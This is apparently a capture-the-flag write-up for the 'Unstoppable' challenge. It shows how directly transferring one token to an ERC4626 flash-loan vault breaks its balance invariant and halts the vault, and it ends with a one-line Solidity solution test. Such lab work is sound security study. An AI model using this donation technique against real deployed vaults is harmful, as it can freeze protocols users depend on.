# Unstoppable

One contract was inherited and passed only the address for interactions and the other in the constructor is expanded for the current contract and complements its logic.
```
 constructor(
        ERC20 _asset,
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol, _asset.decimals()) {
        asset = _asset;
    }

function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    }
```

totalSupply - We did a mint and a deposit, so totalSupply here is 1,000,000. That is the number of “second” tokens released into the vault via deposit.

totalAssets - returns the asset.balance of this, we specified the address for the asset in the vault constructor and here we find out how many main tokens are in the vault, if we add them to it

```
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```
Before
        //balanceBefore 1 000 000 - main tokens here
        //totalSupply - issued shares via deposit - 1 000 000
After
        //If you send 1 token directly to the address it will be:
        //convertToShares(totalSupply) - 999,999 | balanceBefore - 1,000,001

```
Solution:
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
```

